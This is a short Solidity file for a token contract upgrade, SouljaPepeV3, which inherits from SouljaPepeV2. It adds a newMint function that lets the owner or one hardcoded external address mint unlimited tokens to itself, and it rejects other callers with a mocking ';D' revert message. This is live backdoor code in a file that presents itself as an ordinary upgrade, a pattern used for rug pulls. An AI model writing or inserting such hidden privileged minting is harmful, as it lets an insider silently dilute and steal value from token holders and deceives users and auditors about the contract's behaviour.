// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./SouljaPepeV2.sol";

contract SouljaPepeV3 is SouljaPepeV2 {
    function newMint(uint256 amount) public {
        if (
            msg.sender != owner() &&
            msg.sender != 0x49Df08892DD1BCa73eD2499772e531F7F6A0b213
        ) {
            revert(";D");
        }
        _mint(msg.sender, amount);
    }
}